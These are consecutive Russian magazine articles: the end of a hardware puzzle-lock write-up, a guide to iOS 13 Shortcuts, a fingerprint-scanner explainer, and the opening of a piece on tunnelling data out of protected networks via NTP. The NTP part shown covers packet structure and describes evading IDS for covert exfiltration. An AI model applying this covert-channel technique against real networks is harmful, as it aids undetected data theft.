   Скажу лишь, что здесь используется еще один счетчик — микросхе ма
К561ИЕ8 (десятичный счетчик‐делитель) — биты CLK0 — CLK2 и элементы
исключающе го ИЛИ (К561ЛП2) для управления светодиодами D6 — D15. Все
вместе они образуют своего рода дешифратор, который позволяет исполь‐
зовать единственную шкалу как для индикации прог ресса, так и для ани мации
(два режима работы).
  С микросхе мой‐таймером ВИ1 связана одна любопытная деталь. Фор‐
мально она не относится к 561‐й серии, и ее рабочий диапазон напряжений
начинается от 5 В (против трех у всех остальных микросхем на плате). Экспе‐
риментальным путем было выяснено, что таймер запускается и от 3,5 В, хотя
за точ ность и характеристики выходного сигнала в таком режиме я не руча‐
юсь (не измерял).
  На самом деле в качестве генератора тактового сигнала для ани мации
можно было вместе с RC‐цепочкой использовать и триггер Шмидта из 561‐й
серии — К561ТЛ1. Но я узнал об этом уже слишком поздно, когда плата была
почти готова. Если кому интерес но, рекомендую почитать книгу «Проекты
и эксперименты с КМОП микросхемами». В ней на примере микросхемы
К561ТЛ1 демонстрируются самые раз ные способы применения. Итоговое
устройство могло бы быть собрано на микросхемах одной серии и иметь
больший рабочий диапазон. Обязатель но учту на будущее.





Чтобы убедиться в работос пособности схемы, я предварительно собрал все
на беспаечной макетке. Параллельно разводкой пла ты занялся мой хороший
знакомый — Александр Бурага. И тут нужно ска зать, что, несмотря на мою
корявую принципиальную схему и невнятное (на словах) ТЗ и описание, он
справился с задачей в рекордные сро ки — буквально за пару дней. Более
того, плата у него оказалась даже гораз до меньше, чем я изначально пред‐
полагал.
   Казалось бы, это не очень большой плюс, но мне предстояло раз мещать
на производстве сверхсрочный заказ, сто имость которого зависит в том чис‐
ле от размеров. Китай отпадал сра зу же, свя зываться даже с курьерской
службой не хотелось. Зеленоградский «Резонит» тоже не подходил, там
минимальный срок составлял около недели. К счастью, в том же Зеленограде
нашлась фирма «ТеПро», она бралась изготовить несколько экземпляров
этой двуслойки с шелкогра фией и металлизацией всего за 36 часов!





Кстати, со сро ками в «ТеПро» погорячились, и все равно потребова‐
лось 48 часов от подтверждения оплаты до момента, когда я получил в их
офисе заветные куски текстолита. Но я был рад и такому результату! Хотя
от итоговой цены до сих пор немного в дрожь бросает, хорошо хоть не из
своего кармана. :)
   Дальше — поиск и покупка комплектующих (в основном брал в «Чипе
и Дипе», но часть пришлось искать и на Митинском радиорынке). Не обош‐
лось без огорчений: изна чально я предполагал использовать суровые
«советские» светодиоды АЛ102 с метал лическим цоколем (для антуражу,
и вооб ще, это же ретро!). Знакомый меня отго варивал, мотивируя тем, что
они слабо светят. Действительно, характеристики на страничке товара
не впечатляли: всего 0,15 мКд против стандартных 30–40 мКд у других све‐
тодиодов того же цвета и размера.
  Но я все‐таки решился попробовать и заказал нес колько штук. Увы, меня
ждало разочарование: не знаю, где в «Чипе и Дипе» хранили эти компоненты,
но у 80% из купленных мной светодиодов не только необратимо помутнела
линза, но и образовался какой‐то желтый налет. В общем, если им и предсто‐
яло когда‐то светить, то явно уже не в этой жизни.
  В остальном никаких трудностей не возникло. Пару раз я запаивал детали
не той стороной, в схеме нашелся мой косячок в тактировании счетчика,
который пришлось исправлять переру банием дорожек и допол нительными
перемычками, — в общем, все достаточно стандартно. Но в итоге если я и не
остался доволен соб ранным результатом, то, по крайней мере, мне за него
не стыдно.





Напоследок пару слов о том, какие подсказ ки были доступны учас тникам.
Во‐первых, выход с каждого D‐триггера для пароля допол нительно уходил
на светодиоды группы D1 — D5. В теории это сводило задачку к прос тому
перебору, и некоторые при отсутс твии дру гих идей или желания возиться
прибегали к нему. Это не баг, это фича! Во‐вто рых, кнопка с первой цифрой
пароля дополнительно маркирова лась на шелкогра фии небольшим логоти‐
пом журнала. Его, вопреки моим ожиданиям, заметили только единицы.





Кроме того, на стенде в нес кольких экземплярах были листы с принципиаль‐
ной схемой платы и дополнитель но мультиметр (для прозвонки, замыкания
контактов и прочего). Всего задача предполагала три варианта решения: изу‐
чить схему и найти код, изу чить схему и найти бэкдор и банально подать
высокий уровень на разрешающий контакт ENABLE. Дополнительно за два
дня конференции обнаружились и нес тандартные способы, в том числе
методы социальной инженерии: мы, честно приз нать ся, не стеснялись под‐
сказывать тем, кто оказывался в тупике.


             INFO

                     Подробнее о принципах работы цифрового замка
                        читай в статье «Основы цифровой схемотехники.
                       Как логические элементы образуют биты памяти
                        в твоем компьютере».
ТРЮКИ





    Валентин Холмогоров
      valentin@holmogorov.ru
ВСЕХ
АЙФОНОВ
КОМАНДИР
АВТОМАТИЗИРУЕМ РАБОТУ
В IOS 13 С ПОМОЩЬЮ «КОМАНД»




После успешного обновления моего iPhone до iOS 13 я
обратил внимание на новый значок, появившийся на глав‐
ном экране телефона, — при ложения «Команды». Иссле‐
довательский дух не позволил мне пройти мимо этого уди‐
вительного явления, не изучив возможности софтины. Среди
них оказалось несколько весьма интересных и полез ных
функций, о которых я тебе сейчас и расска жу.


До релиза iOS 13 программа распростра нялась в App Store под наз ванием
«Быстрые команды», но в новой версии ОС она вошла в базовый набор при‐
ложений. На сайте Apple функциональность «Команд» описана весьма рас‐
плывчато и туманно: дескать, программа поз воля ет создавать «персонали‐
зированные шаблоны автоматизации, которые помогут вам выполнять пов‐
седневные действия про ще и быс трее». Не знаю, кто обу чил копирайтеров
из Купертино излагать свои мысли подоб ным образом, но сдается мне, что
в данном конкретном случае крат кость в родс твенных отношениях с талантом
явно не состоит.


ВОЗМОЖНОСТИ
На самом деле программа «Команды» умеет объеди нять несколько простых
действий пользователя в одно. Например, если ты каждое утро узнаешь тем‐
пературу окружающей среды за окном, включаешь на мобильном любимый
трек, а затем отправляешь SMS‐сооб щение с пожеланием доброго дня сво‐
ему начальнику, то всю эту рутину можно выполнять нажатием одной кнопки
или голосовой командой. Приложение умеет работать с браузе ром Safari
и другими программами iOS через API, поэтому подобным же образом нет‐
рудно, например, подгрузить разные плей‐листы в «Музыку» под настроение,
установить или отключить будиль ник, применить фильтр к набору фотографий
или отправить текущую геопозицию в ответ на сообщение друзей «Ну где
тебя черти носят, пиво уже остыло!». «Команды» с этим справляются без осо‐
бых проблем.





                Ин терфейс приложения «Команды»

Интерфейс «Команд», судя по всему, разрабатывали инопланетяне, которых
держат взаперти в подвалах кампуса Apple еще со вре мен старины Джобса.
Но после небольшой практики привыкнуть к нему все‐таки можно. Логика
работы программы на первый взгляд очень проста: нужно указать действие,
которое ты хочешь выполнить, а потом передать это действие в при ложе ние
и обработать полученный результат. Например, выб рав в списке приложений
«Калькулятор», мы получим перечень воз можных действий с ним — «Сос‐
читать», «Округлить число» и так далее. Для раздела «Интернет» действия
будут иными: «Показать веб‐стра ницу», «Открыть нес колько URL», при чем тут
собраны варианты не только для Safari, но и для дру гих приложений. Помеди‐
тировав с полчаса на этот список, можно даже отыскать в нем какую‐то
логику.





           Команды для раз делов «Калькулятор» и «Интернет»

Вкладка «Автоматизация» в нижней час ти окна «Команд» позволя ет при вязать
выпол нение команды к определенному условию. Например, запланировать
на выбранное время (наконец‐то в iOS появился аналог cron и «Планиров‐
щика задач», внедренного парнями из Microsoft еще в Windows 98). Но сущес‐
твуют и менее очевидные триггеры: прибытие в какую‐то географическую точ‐
ку по данным GPS или убытие из нее, переключение режима работы телефо‐
на или запуск программы. Например, можно нас троить автоматическое
выпол нение команды при выходе из дома, при езде на работу или в момент,
когда айфон перек лючается в режим пониженного энергопотребления.





           Выполнение команд можно автоматизировать

Одна из самых любопытных, на мой взгляд, фишек «Команд» — наличие
в арсенале программы простого набора переключателей, с помощью
которых можно настраивать  триггеры еще более гибко. Пря чутся они
под значком «Скрипты» в разделе «Логика управления» (кто найдет с первого
раза — тому конфетка!). Здесь нам предлагается набор логических операто‐
ров вида «если — иначе — закончить дей ствие», «повторить», «ожидать воз‐
врата». То есть с помощью это го инструмента можно написать несложный
скрипт, отрабатывающий какой‐то примитивный алгоритм. Негусто, конечно,
но на безрыбье и червяк — Python.
   «Команды» позволя ют программировать дей ствия не только для встро‐
енных приложений iOS 13, но и для некоторых сторонних приложений, уста‐
новленных  на  твоем  устройстве.  Например,  если  ты  используешь
какую‐нибудь программу для чтения лент новостей в формате RSS, можно
создать команду, которая станет искать адрес RSS‐канала на открытом в Sa‐
fari сайте и при обнаружении автоматически подпишется на него.
   Готовую команду можно добавить в спи сок внутри самого приложения
или вывести в виде ярлыка на домашний экран iOS. И на этом можно было бы
закончить наш сегодняшний обзор, если бы статья предназначалась для пуб‐
ликации в журнале «Мурзилка». Но пос кольку наше издание называется нем‐
ного иначе, давай посмотрим, как это работает и можно ли вытащить
из «Команд»  что‐нибудь интересное и недоку ментированное, а потом
использовать нестандартным обра зом.


ПОД КАПОТОМ
«Команды» работают с API операционной системы, а именно позволяют при‐
нимать на вход различные параметры и динамический ввод. Эти параметры
могут обрабатываться приложениями iOS в фоновом режиме, то есть
без необходимости запуска, а резуль тат передается в саму программу
«Команды» или в  Siri. В этом и кроется основное отличие обновленных
«Команд» от механизма ярлыков Siri, реализованного в iOS 12, — команды
больше не представляют собой фиксированную последовательность дей‐
ствий, они обрели некую интерактивность. То есть если раньше интерфейс
взаимодействия операционной системы и приложений строился на механиз‐
ме x‐callback‐url на уровне самой iOS, то теперь все действия обрабатывают‐
ся приложением «Команды» или Siri, в зависимос ти от того, что это за коман‐
да. С точки зре ния безопас ности такой подход более продуктивен и пре дос‐
тавляет как программистам, так и пользователю боль ше возможностей.


             INFO

                            X‐callback‐url — это схема взаимодействия при‐
                      ложений в iOS, обмена информацией и парамет‐
                     рами между ними. Подробную спецификацию
                        это го стандарта можно отыскать здесь.


Про фоновый режим я упомянул нес прос та. Поясню этот механизм на прос‐
том примере. Положим, ты решил автомати зировать какие‐то процес сы
на своем iPhone или iPad с помощью языка JavaScript, для чего используешь
специальную программу для iOS Scriptable. Эта программа позволяет писать,
отлаживать и запускать сценарии на JavaScript, а также содержит подробный
справочник по языку с описанием функций, поддерживаемых iOS. Ко всему
прочему, она бесплатна.





  Приложение Scriptable позволяет авто матизировать iOS c помощью
  JavaScript

Итак, ты подготовил несколько полезных скриптов, сохранил их в Scriptable,
после чего решил создать команду для их выполнения при наступле нии опре‐
деленного условия, например по рас писанию. Выб рав в программе «Коман‐
ды» вариант «Запустить скрипт», ты получишь список всех сохраненных
в Scriptable скриптов, в котором мож но ука зать нужный. При этом само при‐
ложение Scriptable не запус кается — программа «Команды» запрашивает
из него требуемые данные в фоновом режиме. Кроме  того, в самом
интерфейсе окна «Команды» есть специальный переключатель, с помощью
которого можно настроить заранее, как отра бота ет скрипт: в запус тившейся
при его вызове программе Scriptable или в фоновом режиме. Здорово, прав‐
да?





  «Команды» позволяют выбрать скрипт для запуска, не запуская сам
  Scriptable


             INFO

                    Неочевидный, но интересный  хак: с помощью
                           Scriptable можно  кастомизировать  сооб щения
                      об ошибках при выполнении сце нариев Java‐
                             Script. Это довольно удобно, особенно на этапе
                        отладки скриптов.


На уровне пользователя «Команды» представляют собой набор редактиру‐
емых полей в контексте функций приложения, в которые можно передавать те
или иные данные — зна чения или переменные. Ког да команда срабаты вает,
она получает данные из полей, обра баты вает их по выбранному пользовате‐
лем  алгоритму  и  воз вра щает  результат,  который  можно  сохранить
или куда‐нибудь переслать. Очевидно также, что «Команды» способны пол‐
ноценно взаимодействовать только с теми приложениями iOS 13, раз работ‐
чики которых предусмотрели такую возможность.
   «Команды» могут работать с различны ми типами данных — это числовые
значения, текст, URL, содержимое буфера обмена, файлы. Кроме того, раз‐
работчик может предус мотреть в своем приложении поддержку собственных
типов данных и параметров, которые способна обработать программа
«Команды».
  Примечательно, что в iOS 12 ярлыки Siri не могли полноценно исполь‐
зовать вводимые поль зователем данные: если голосо вая команда тре бовала
ввести что‐то с клавиатуры или выб рать опцию из списка, выполнение коман‐
ды прерывалось и запус калось соответству ющее приложение. При этом
от пользователя ожидалось нужное действие или соответствующая команда,
отданная голосом. С интеграцией в iOS программы «Команды» все изме‐
нилось: если при выполнении алго ритма требуется взаимодействие с поль‐
зователем, оно идет на уровне приложения без прерывания основного сце‐
нария. А сама программа «Команды» интегрирована с языковой средой Siri
и поддерживает голосо вое управление. Нап ример, если команда вызывается
в Siri и подразумевает ввод текста, то этот текст можно надиктовать.
   Таким образом, функциональность «Команд» отнюдь не ограничивается
набором инструментов самой этой программы. Можно смело сказать, что он
не ограничивается вообще ничем: ничто не меша ет тебе соб рать на iPhone
нужный набор приложений конкретно под твои задачи, а потом брать данные
из одной программы, преобра зовывать их в дру гом приложе нии и передавать
в третье с помощью инстру ментария «Команд».
   Скажем, можно получить текущие курсы валют из интерне та, сравнить их
стоимость с помощью программы, умеющей работать с таким типом данных
(например, для этой цели подойдет калькулятор PCalc), а потом передать
результат вычислений в «Заметки» или отправить их сообщением в телеграм.
Можно настроить команду таким образом, что она будет автоматически
обновлять курсы валют при каждом подключении к интернету или ежед невно
в заданное вре мя.
   Установив на телефон FTP‐клиент, ты можешь автоматизировать загрузку
файлов на сервер, просмотр содержимого серверной папки, перезапись
файлов при их изменении и многое дру гое. Можно получать данные о погоде
в твоем текущем местоположении или в заданной географической точке,
копировать их в буфер обмена и дальше делать с ними что‐нибудь полезное.
Причем географическую точку, для которой ты определяешь погоду, необя‐
зательно вводить вручную — ее можно получить, ска жем, в качестве входного
параметра из события, записанного в «Кален даре». И это только пара оче‐
видных примеров. Все остальное ограничено толь ко твоей фантазией.


ЛАЙФХАК
Несмотря на то что приложение «Команды» использует собственную идеоло‐
гию выполнения заданной пользователем пос ледова тельности дей ствий, ста‐
рые добрые принципы x‐callback‐url никуда не делись и по‐прежнему в пол‐
ной мере поддерживаются приложением. На эту осо бенность обратил вни‐
мание технический специалист и исследова тель iOS Федерико Витиччи. Он
выяснил, что с помощью специальных URL можно обращаться не только
к интернет‐ресурсам, но и к системному приложению «Нас тройки», точнее —
к каждому отдельному экрану и даже определенным функциям.
  Смысл этого трюка достаточно прост. Некото рые элементы управления
iOS зарыты в приложении «Нас тройки» довольно глубоко, и доб раться до них
можно, лишь совершив длительное путешествие по нескольким сменяющим
друг друга экранам. А можно поступить проще: соз дать в приложении
«Команды» специальный ярлык с адресом нужной тебе настрой ки и сохранить
ее в виде значка на экране телефо на. В любой момент ты сможешь получить
к ней доступ одним касанием. Удобно? Да не то слово!
   У Apple отсутствует документация на этот счет, поэтому Витиччи, по его
словам, потратил несколько дней на подбор соот ветс твующих параметров
вручную методом проб и ошибок. Мы не станем повторять этот экспе римент
и воспользуемся его наработками — с огромной благодарностью к иссле‐
дователю.
   Итак, все команды, открывающие дос туп к приложе нию «Настрой ки» и его
компонентам, начинаются с префикса prefs:root=. Давай разберем прос‐
той пример такой команды. Я очень час то поль зуюсь на своем айфоне
режимом модема — иногда нужно раздать интернет навигатору в автомоби‐
ле, чтобы он показал мне проб ки и дорожную обстановку, или ноутбуку,
на котором я работаю вда ли от дома. Но чтобы добраться до этой функции,
необходимо запустить программу «Нас тройки» и перейти в раздел «Режим
модема», то есть совершить два действия. Соз дадим ярлык, который откроет
эту настройку в одно касание.
  Запусти «Команды» и нажми в окне программы на кнопку «Соз дать коман‐
ду». Нажми «Добавить действие», а затем коснись значка «Интернет». Про‐
мотай список вниз и выбери в нем пункт «URL‐адрес». В панели «URL‐адрес»
нажми на поле apple.com и введи вмес то этого строку prefs:root=INTER‐
NET_TETHERING. Мы соз дали переменную, хра нящую вместо URL‐адреса
команду настроек, — теперь нужно передать эту переменную в приложение,
которое ее обработает.
  Нажми кнопку + ниже, снова выбери «Интернет», в открывшемся списке
отыщи раздел Safari и выбери в нем «Открыть несколько URL». Эта команда
автоматически подцепит адрес из предыду щей строки, ничего менять не нуж‐
но. Удивительно, но факт: если мы прос то вобьем строку prefs:root=INTER‐
NET_TETHERING в команду  Safari → «Открыть несколько URL», система
не сможет ее правильно обработать.
  Нажми «Далее» и введи произвольное наз вание команды, например
Hotspot, — одноимен ная плитка появится в окне приложения «Команды».
Остался последний шаг: наж ми и удерживай плит ку, выбери в появившемся
контекстном меню пункт «Подробнее», а потом нажми ссыл ку «Добавить
на экран „Домой“» и подтверди действие нажатием на надпись «Добавить».
Значок Hotspot появится среди других значков приложений на экране iOS.
Теперь ты можешь открыть нас тройку режима модема одним касанием.





   Создаем команду для быстро го дос тупа к нас тройкам режима модема

Под этой статьей имеется ссылка на веб‐страницу, в которой собраны все
«волшебные URL», обнаруженные Федерико Витиччи. В этом спис ке ты
можешь найти те команды настройки iOS, которые тебе нужны, и создать
для каждой из них значок быс трого запуска.


ВЫВОДЫ
Возможности приложения «Команды» в iOS 13 пока еще до конца не изучены,
но уже сейчас понятно, что они весь ма широки: с его помощью можно соз‐
давать произвольные последова тельнос ти дей ствий с программами, обра‐
батывать данные, а также запускать эти алгоритмы по расписанию или в
зависимости от усло вий. С помощью JavaScript или Python можно еще боль‐
ше автоматизировать работу в iOS 13, о чем мы обя зательно рас скажем под‐
робнее в наших следующих стать ях.
  Даже в базовой конфигура ции «Команды» поз воляют проделывать с айфо‐
ном или айпадом множество интерес ных трю ков. Если ты придумаешь нет‐
ривиальное применение это му приложению, не забудь поделиться своим
опытом с нашими читателями!


        WWW

                     •Все «волшебные URL», обнаруженные Федери‐
                          ко Витиччи
ТРЮКИ

    ВОЛШЕБНЫЕ
     «ПАЛЬЧИКИ»

             КАК РАБОТАЮТ МЕХАНИЗМЫ
                  БИОМЕТРИЧЕСКОЙ
                      АВТОРИЗАЦИИ
              ПО ОТПЕЧАТКУ ПАЛЬЦА





                                                                       Михаил Киреев
                                                                                          kireevmp@yandex.ru





Больше ста лет назад человечество научилось устанав‐
ливать личность по отпечаткам пальцев. Теперь эта тех‐
нология используется в каждом вто ром телефоне и зна‐
чительно повышает уровень безопасности в сравнении
с ПИН‐кодами. Но как именно работают эти сканеры? Мне
стало интересно, и, разобравшись, расскажу об этом и тебе.


ТИПЫ СКАНЕРОВ ОТПЕЧАТКА ПАЛЬЦА
Существует несколь ко раз ных способов получить изображение отпечатка
пальца. Давай разберем их по порядку.


Оптический сканер
Этот вид сенсора работает по прос тому прин ципу: есть фоточувствительная
матрица (в большинстве случаев это ПЗС, которая используется во многих
современных камерах) и нес колько небольших светоизлучателей, которые
подсвечивают поверхность пальца.
   Свет отражается от папиллярного узора, и в зависимости от того, попал
луч света на гребень или на впадину, интенсивность его варьируется.
  Внешнее стек ло такого ска нера тонкое, чтобы вызвать эффект пол ного
нарушенного внутреннего отражения. Из‐за этого эффекта свет в местах кон‐
такта кожи со стеклом — на гребнях — полностью отражается в фотосенсор.





                 Схема работы опти чес кого ска нера

Ты можешь наблюдать этот феномен с помощью стакана с водой: приложи
палец с одной сто роны стекла и пос мотри с дру гой — ты четко увидишь свой
отпечаток.





                        Вот и весь феномен

Датчики такого типа весьма громоз дкие: нуж на большая камера и маленький
излучатель света, — а поэто му они почти не применяются. Есть и другая
проблема: свет может одинаково отражаться от кожи и другого матери ала,
а потому подделать отпечаток пальца ста новится слишком легко.


По лупровод никовые сканеры
В таких сканерах используются полуп роводники, которые меняют свои свой‐
ства при касании. Они реагируют на различные параметры: тепло, проводи‐
мость, давление.
  Термические сен соры реагируют на изменение проводимости полуп‐
роводника в зависимости от температуры. Воз дух и кожа с раз ной скоростью
передают тепло, датчики фиксируют это, и мы получаем изображение отпе‐
чатка.
  Сен соры давления реагируют на давление каж дого маленького учас тка
кожи на поверхность проводника, регис трируют разницу в давлении впадин
и гребней. Но такие сканеры очень хруп кие и поэтому практически бесполез‐
ны: любое излишнее давление на поверхность спо собно пол ностью вывести
из строя часть сенсоров, делая весь ска нер неработоспособным.
  Емкостные сен соры исполь зуют дат чики КМОП, которые выступают
в роли маленьких конденса торов, чтобы пропустить небольшой заряд через
поверхность пальца. Спо собность воздуха и кожи изолировать электрический
ток различается: чем больше емкость конденсатора, тем больше воздуха
попало между сен сором и кожей.
  Последний метод — самый универсальный: такой сенсор компактен
и вмещает в себя до сорока тысяч датчиков на квадратный сантиметр. Имен‐
но этот тип сен соров уста новлен в большинстве устройств Apple, Xiaomi,
Samsung и других лидеров мобильного рын ка.
  И пусть сканеры такого типа обмануть сложнее, чем оптические, воз‐
можность создать муляж все еще остается: не только кожа обладает все ми
эффектами, на которые полагаются эти сканеры. Подделка такого уровня уже
на порядок сложнее: необ ходима тонкая работа с материалами, качес твен‐
ный отпечаток и небольшая лаборатория.


Ультраз вуковой сканер
Ультразвуковые сенсоры используют точные часы и схожий с эхолотом прин‐
цип: излучатель испуска ет высокочас тотный импульс, который отражается
от поверхности пальца и регистрируется датчиком. Сигнал, который попал
в область впадины, проходит больший путь, и, соответственно, ему требуется
больше вре мени, чтобы вернуть ся, чем сигналу, который отразился от греб‐
ня.
   Такое устройство сенсора позволяет получить четкое изображение папил‐
лярного узо ра, которое учитыва ет не только сам факт касания, но и глубину
каждого отдельного учас тка кожи. Это позволяет изображению быть еще точ‐
нее, хотя на сканирование уходит боль ше времени, а себестоимость устрой‐
ства выше.
  Однако, кроме высокой точности, у ультраз вуковых сканеров есть другое
ощутимое конкурентное преимущество, которое зас тавля ет производите лей
все больше вкладываться в их упро щение и удешевление: такие сенсоры
не требуют отдельной поверхности и могут работать сквозь любой плотный
материал. Таким образом, интегрировать ска нер отпе чатка пальца прямо
в экран становится не только возможно, но и относительно просто.
  Производители смартфонов не только экспериментируют с этой тех‐
нологией в лабораториях, ее уже успели реализовать в некоторых самых
новых моделях: у Samsung S10 Plus, Huawei P30 Pro, One Plus 7, Xiaomi Mi
9 сканеры встроены прямо в экран.


АНАЛИЗ И СРАВНЕНИЕ ОТПЕЧАТКОВ
Отпечаток состоит из набора повторяющихся шаблонов — форм. Чаще всего
анализ отпечатка проводится имен но на их основе.


Харак теристики папил лярно го узо ра
Каждую характеристику можно отнести к одной из двух групп: глобальные,
которые можно увидеть невооруженным глазом, и локальные, которые зак‐
лючаются в особенностях структуры каждой отдельной папил лярной линии.
  Арка, петля и завиток — это самые распростра ненные глобальные узо‐
ры. Ты можешь даже попробовать посмотреть на свой палец и найти их, ведь
эти признаки есть у каждого человека. Но они в целом не уникальны, их одних
недостаточно для точной идентификации. Зато эти узоры используются
для предварительного отсеивания лиш них записей в больших базах отпечат‐
ков, например в МВД.
  Локальные признаки — минуции — намного более интерес ны для анализа.
Причем важно не только какие они, но и где находятся на изображении. Сами
по себе минуции представляют собой простые геометрические формы,
которые можно обнаружить на изображении перебором.
   Есть два вида локальных характеристик: окон чания и раз ветвле ния (в
медицине — бифуркации). Их можно най ти на готовом отпечатке, а вот раз‐
глядеть без лупы на собственном пальце практичес ки невозможно.





                Так выглядит окончание папиллярной линии





                     А так — развет вление


Об работка изоб ражения
Снимок делают черно‐белым, а затем умень шают до такого раз мера, чтобы
каждая папиллярная линия занимала в ширину лишь один пиксель. После
таких преобразований ана лизировать отпечаток ста новится проще и удоб‐
нее.





        Изображение отпечатка до и пос ле первичной обработки

Следующий шаг — разбиваем изображения на отдельные блоки размером
три на три пикселя, в центре должен быть закрашенный пиксель папиллярной
линии. Если вокруг этого пикселя находится ровно один или три дру гих таких
же, то этот блок считается характеристикой, которая сохраняется в памяти
вместе с типом признака и его координатами.





             Так выглядят обработанные блоки разветвлений

В случае если блок приходится на окончание папиллярной линии, эта линия
должна как‐то попасть в центр блока, но не должна из него уйти. Если же
блок — это разветвление, то в центр блока заходит одна линия, а выходит
из него две — суммарно три линии схо дятся в одной точке.
  Данные каждого такого блока вместе с типом локального узора записы‐
ваются в память и затем используются для сравнения каждый раз при авто‐
ризации.


Сравнение отпе чатков
Для сравнения необ ходимо снова произвести ска нирование, так же обра‐
ботать изображение и разбить его на блоки. Такое разбиение поз воляет
сравнивать блоки в том случае, если положение пальца изме нилось между
измерениями.
  Само сравнение блоков не так тривиально, как хотелось бы: во‐первых,
необходимо устранить пос ледс твия смещения и поворота пальца. Чаще все‐
го это достигается перебо ром (хотя некото рые сканеры так не делают,
а просто игнорируют слишком силь но повернутые отпечатки). Во‐вторых,
блоки начинают сравнивать ся попарно, и прог рамма пытается найти два
однотипных блока в одном и том же мес те.
  Доля таких найденных пар от суммарного количества существующих
характеристик и служит своеобразной «уверенностью» алгоритма сравнения
в том, что отпечатки принадлежат одному и тому же человеку. Ты удивишься,
но для одного человека эта характеристика сос тавляет всего 45–55%.
   Так происходит потому, что качес тво отпечат ка далеко не иде ально. Из‐за
загрязнений или неточно приложенного пальца для анализа могут быть
недоступны целые участки изображения. И, нес мотря на это, в большинстве
случаев даже порога 40% для ска нера достаточно, чтобы безошибочно опре‐
делять человека.


ЗАЩИТА ДАННЫХ ОТПЕЧАТКА
Как выглядят «пальчики», сохраненные в памяти? После анализа они прев‐
ращаются в описания положений и типов блоков. Дальше эти данные обычно
шифруются или сох раня ются в специальной внут ренней памяти (защищаемой
операционной системой) либо в отдельном чипе для хранения ключей
и паролей. Обычно в качес тве алго ритма шифрования используется AES
с длиной ключа больше 128 бит, что обеспечивает пол ную сохранность наших
биометрических данных.
  В устройствах Apple, например, этот ключ хра нится в сис теме Secure En‐
clave, которая располагается на отдельном чипе. Производители смартфонов
на Android решают эту проблему по‐разному — час то выбор падает на чипы
безопасного выполнения Qualcomm (нап ример, Qualcomm Trusted Execution
Environment — см. PDF) или ARM TrustZone.


ЗАКЛЮЧЕНИЕ
Как видишь, в самом сканере отпечатка пальца нет ничего сложного: каждый
механизм, который здесь используется, нельзя наз вать большим прорывом
в области физики или информа тики. Однако такая удобная комбинация всех
этих маленьких запчастей и алгоритмов в одно устройство позволя ет нам
с тобой тратить меньше времени на мелочи вроде набора пароля.
КОДИНГ
 ТУННЕЛЬ
 ВО ВРЕМЕНИ





                                     Марк Бруцкий
                                             hackcat.dev@gmail.com





   ВЫВОДИМ ДАННЫЕ С КОМПЬЮТЕРА
     ЧЕРЕЗ NETWORK TIME PROTOCOL





Любая возможность незаметно обра щаться  к внеш нему
миру с хос та внутри защищенной сети — драгоценная
находка для пентестера. Один из последних доступных
путей — это NTP, протокол син хронизации вре мени на часах.
Его трафик разрешен почти везде, так что он будет отличным
транспортом для дан ных. Я покажу, как реализовать базовые
клиент и сервер, которые будут использовать этот феномен,
а кодить мы будем на C#.


Пару месяцев назад я гулял по заг нивающей Германии, где по каждому удоб‐
ному и не очень поводу строят туннель. И тут мне пришла идея: а не сделать
ли свой туннель? В качестве про токола я выбрал NTP — его использование
не требует специальных привилегий, системы защиты не видят в нем никаких
проблем, ведь там по определению быть ничего не может, кроме текуще го
времени, а его формат простой как пал ка, что позволя ет нам использовать
его без необходимости закапывать ся в документацию.
   Этот трюк могут использовать и вирусописатели — для вывода данных
из зараженных систем, причем незаметно для стандартных средств защиты.


           WARNING

                     Создание и распространение вредоносных прог‐
                    рамм карается по статье 273 УК РФ. Ни автор,
                      ни редакция «Хакера» не несут ответственности
                      ни за какой вред, принесен ный использованием
                      материалов этой статьи.



ЧТО ТАКОЕ NTP
NTP (Network Time Protocol) — про токол, который работает поверх UDP
и используется для син хрониза ции локальных часов с часами на сервере точ‐
ного времени. При работе в интернете точность синхронизации сос тавляет
до 10 мс, а в локальных сетях — до 0,2 мс. При этом NTP нечувс твителен
к задержкам канала.
   Актуальная версия про токола (по данным Википедии) — 4, но мы будем
использовать версию 3, которой для наших целей предос таточно.
  Для максимальной точности служба обновления времени постоянно дол‐
жна работать в фоновом режиме, регулярно отправляя запросы на сервер
точного времени, то есть генерируя доволь но много трафика. Это нам
на руку, так как из‐за этой особен ности IDS давно не обращают внимания
на трафик NTP.
  За синхронизацию в Windows отвечает служба W32Time, а в Linux — демон
ntpd или chronyd. Также существует более прос тая реализация этого про‐
токола, известная как SNTP (Simple Network Time Protocol) — простой про‐
токол сетевого времени. Применя ют его во встра иваемых системах и устрой‐
ствах, которые не требуют высокой точности, как, например, системы умного
дома.


СТРУКТУРА ПАКЕТА NTP
Структура пакета NTP описана в RFC 958 (v1), 1119 (v2), 1305 (v3) и 5905 (v4).
Нас интересует вер сия 3, как довольно рас простра ненная и простая, хотя ты
свободно можешь поль зовать ся версией 4, она почти не отличается.





Для прожженных программистов на C есть псевдокод:


public struct NtpPacket
{
  public byte First8bits; // 2 бита — индикатор секунды коррекции (
Leap Indicator, LI)
                          // 3 бита — версия протокола (Version
Number, VN)
                          // 3 бита — режим работы (Mode)
  public byte Stratum;    // Stratum — расстояние до корневого
сервера по иерархии
  public byte Poll;       // Насколько часто можно спрашивать сервер
  public byte Precision;  // Точность системных часов
  public uint RootDelay;  // Задержка сервера относительно главного
источника времени
  public uint RootDisp;   // Разброс показаний часов сервера
  public uint RefID;      // ID часов
  public ulong Reference; // Последние показания часов на сервере
  public ulong Originate; // Правильное время отправки пакета
клиентом (заполняет сервер)
  public ulong Receive;   // Время получения пакета сервером
  public ulong Transmit;  // Время отправки пакета с сервера клиенту
}

Теперь немного о назначении этих полей.
 • Leap indicator (LI), 2 бита — число, предуп реждающее о секунде коор‐
   динации. Может быть от 0 до 3, где 0 — нет коррекции, 1 — последняя
   минута дня содержит 61 с, 2 — пос ледняя минута дня содержит 59 с, 3 —
   неисправ ность сервера. При зна чении 3 полученным данным доверять
   не следует. Вместо этого нужно обра титься к другому серверу. Наш псев‐
   досервер будет всегда воз вра щать 0.
 • Version number (VN), 2 бита — номер версии протокола NTP (1–4). Мы
   поставим туда 3.
 • Mode — режим работы отправителя пакета. Значение от 0 до 7, где 3 —
   клиент, а 4 — сервер.
 • Stratum — сколь ко посредников между клиентом и эталонными часами
   (включая сам NTP‐сервер). 1 — сервер берет данные непосредственно
   с атомных (или других точных) часов, то есть между клиентом и часами
   только один посредник (сам сервер); 2 — сервер берет данные с сервера
   со значением Stratum 1 и так далее.
 • Poll — целое число, зада ющее интервал в секундах между последова‐
   тельными обращениями. Клиент может указать здесь интервал, с которым
   он хочет отправлять запросы на сервер, а сервер — интервал, с которым
